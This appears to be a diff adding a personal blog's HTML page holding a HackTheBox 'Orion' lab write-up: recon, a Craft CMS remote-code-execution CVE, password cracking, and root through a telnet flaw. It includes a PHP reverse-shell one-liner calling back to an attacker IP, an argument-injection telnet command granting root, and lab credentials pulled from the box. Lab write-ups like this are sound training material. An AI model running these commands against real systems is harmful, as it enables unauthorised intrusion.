@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Orion (HTB) write-up :: MK-WriteUps</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Write-up for the Orion box on HTB" />
+<meta name="keywords" content="RedTeaming, HackTheBox, Writeup, Linux, CVEs, Orion" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://Maaroof-Khan10.github.io/posts/4/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://Maaroof-Khan10.github.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://Maaroof-Khan10.github.io/img/theme-colors/red.png">
+  <link rel="apple-touch-icon" href="https://Maaroof-Khan10.github.io/img/theme-colors/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Orion (HTB) write-up">
+<meta property="og:description" content="Write-up for the Orion box on HTB" />
+<meta property="og:url" content="https://Maaroof-Khan10.github.io/posts/4/" />
+<meta property="og:site_name" content="MK-WriteUps" />
+
+  
+  
+  <meta property="og:image" content="https://Maaroof-Khan10.github.io/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-07-08 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="red">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    MK-WriteUps
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://Maaroof-Khan10.github.io/posts/4/">Orion (HTB) write-up</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-07-08</time><span class="post-author">Maaroof Khan</span>
+    
+<span class="post-reading-time">3 min read (574 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://Maaroof-Khan10.github.io/tags/redteaming/">RedTeaming</a>&nbsp;
+      
+      #<a href="https://Maaroof-Khan10.github.io/tags/hackthebox/">HackTheBox</a>&nbsp;
+      
+      #<a href="https://Maaroof-Khan10.github.io/tags/writeup/">Writeup</a>&nbsp;
+      
+      #<a href="https://Maaroof-Khan10.github.io/tags/linux/">Linux</a>&nbsp;
+      
+      #<a href="https://Maaroof-Khan10.github.io/tags/cves/">CVEs</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="orion-htb-write-up">Orion (HTB) write-up<a href="#orion-htb-write-up" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I am taking a different approach for this write-up than usual. A more stream of conciousness style approach so that when I revisit it I can try to understand the thought process and learn how to/not to think.</p>
+<h2 id="initial-recon">Initial Recon:<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>As expected port 22 and 80 are open, doing a sV scan. Added to /etc/hosts. In-depth scan shows nginx running:</p>
+<h2 id="nmap-result">Nmap result:<a href="#nmap-result" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Webpage looks vibe coded. Uses <code>Craft CMS</code> (could be attack vector). Starting with gobuster to find suddirectories.</p>
+<p>Gobuster found <code>/admin</code> which runs <code>Craft CMS 5.6.16</code> which is vulnerable to RCE <em>(CVE-2025-32432)</em> due to a bug in the <code>/actions/assets/generate-transform</code> URI where it can be exploited using POST requests.</p>
+<p>For valid asset id it gives 302 and for invalid it gives 404, this enumeration is the further exploited by uploading php code.
+Read more: <a href="https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/">https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/</a></p>
+<p>Found a PoC on gihub, testing it out now (Didn&rsquo;t work): <a href="https://github.com/CTY-Research-1/CVE-2025-32432-PoC.git">https://github.com/CTY-Research-1/CVE-2025-32432-PoC.git</a>
+The exploit shows it can&rsquo;t parse the output, trying to do a reverse shell to see if we get response.
+Found reverse shell cheat sheet online, using <code>nc -lvnp 9999</code> to listen, testing all to see which one works.</p>
+<p>Previous exploit didn&rsquo;t work probably, trying <a href="https://github.com/cd-ratel/CVE-2025-32432.git">https://github.com/cd-ratel/CVE-2025-32432.git</a>. That exploit didn&rsquo;t work either but it did give me the vulnerable <code>asset ID 2</code> which could be useful.</p>
+<p>Using a different one to confirm <a href="https://github.com/TheMursalin/CVE-2025-32432.git">https://github.com/TheMursalin/CVE-2025-32432.git</a>.</p>
+<p>Cheated a little but found out that using msfconsole works, trying it out. It worked and I got a meterpreter session (Finding <code>asset ID 2</code> was useful afterall)! Now trying to get a proper shell using reverse-shell cheat sheet.
+Used reverse-shell cheat sheet to get a bash shell via netcat, then used:</p>
+<pre tabindex="0"><code>- python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+- Ctrl+Z
+- stty raw -echo; fg; reset
+- export TERM=xterm-256color
+</code></pre><p>You&rsquo;ll get a stable shell!</p>
+<p>Use php for reverse shell as it is more stable than the bash reverse shell on this machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;YOUR-IP&#34;,9999);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span></code></pre></div><p>Running <code>linpeas</code> on vitcim gave us this:</p>
+<pre tabindex="0"><code class="language-conf" data-lang="conf">CRAFT_DB_DRIVER=mysql
+CRAFT_DEV_MODE=true
+USER=www-data
+SHLVL=0
+HOME=/var/www
+OLDPWD=/var/www/html/craft/storage
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+CRAFT_ENVIRONMENT=dev
+LC_CTYPE=C.UTF-8
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DB_SCHEMA=
+CRAFT_DB_USER=root
+_=/usr/bin/sh
+TERM=xterm-256color
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_TABLE_PREFIX=
+PWD=/var/www/html/craft
+PRIMARY_SITE_URL=http://orion.htb/
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+</code></pre><p>A database password, using <code>mysql</code> I found a few databases, in <code>Orion</code> the user table has:</p>
+<pre tabindex="0"><code class="language-bcrypt" data-lang="bcrypt">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
+</code></pre><p>Used <code>John the Ripper</code> to get the password, it is BCrypt, a quick google search and the <code>$2y</code> gives it away:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>bcrypt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+</span></span></code></pre></div><p>We got the password as <code>darkangel</code> and we now have an <code>ssh</code> session as adam! The user flag is revealed.</p>
+<p>Running <code>linpeas</code> again as adam to see if we get some potential attack vectors:</p>
+<ul>
+<li>sudo 1.9.9</li>
+<li>CVE-2021-4034 (High prob) - Failed</li>
+<li>CVE-2026-41651 (Not proper priv esc though)</li>
+</ul>
+<blockquote>
+<p>Lesson learned: first check which services are running (like ports), check their versions and then try to find exploits. If it fails then go for linpeas.</p>
+</blockquote>
+<p>Did cheat a little but found out that <code>port 23 (telnet)</code> was running, checking it&rsquo;s version I found that it is vulnerable <em>(CVE-2026-24061)</em>.</p>
+<p>If I first ran <code>sudo -l</code>, I would have figured out that adam does not have sudo permission at all and I could&rsquo;ve avoided using <code>linpeas</code> at first.</p>
+<p>Following this blog to understand and exploit: <a href="https://www.offsec.com/blog/cve-2026-24061/">https://www.offsec.com/blog/cve-2026-24061/</a></p>
+<p>Since the port is running locally we use 127.0.0.1 as our IP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;-f root&#39;</span> telnet -a 127.0.0.1
+</span></span></code></pre></div><p>And we got root shell!</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
